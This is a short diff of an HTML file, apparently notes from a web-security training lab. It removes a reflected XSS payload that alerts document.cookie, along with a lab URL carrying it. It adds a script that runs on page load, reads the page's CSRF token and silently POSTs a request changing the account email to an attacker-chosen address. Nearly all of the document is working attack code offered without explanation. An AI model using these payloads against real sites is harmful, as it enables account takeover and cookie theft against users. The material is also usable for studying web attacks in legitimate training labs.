@@ -5,14 +5,22 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>title</title>
 </head>
-<body>
-    <h1>title</h1>
-    <input2 type="text" id="input"></input2>
+
+<script>
+    window.addEventListener("DOMContentLoaded", function(){
+        var token = document.getElementsByName('csrf')[0].value;
+
+        var data = new FormData();
+        data.append('csrf', token);
+        data.append('email', 'changed32@gmail.com');
+
+        fetch('/my-account/change-email',{
+            method: 'POST',
+            mode: 'no-cors',
+            body: data
+        });
+
+    });
+</script>
 </body>
 </html>
-
-
---Payload--
-<custom-tag onfocus='alert(document.cookie)' id='x' tabindex="1">
-
-    https://0a83001b04a77ebd83d59b8a00e000b7.web-security-academy.net/?search=%3Ccustom-tag+onfocus%3D%27alert%28document.cookie%29%27+id%3D%27x%27+tabindex%3D%221%22%3E#x
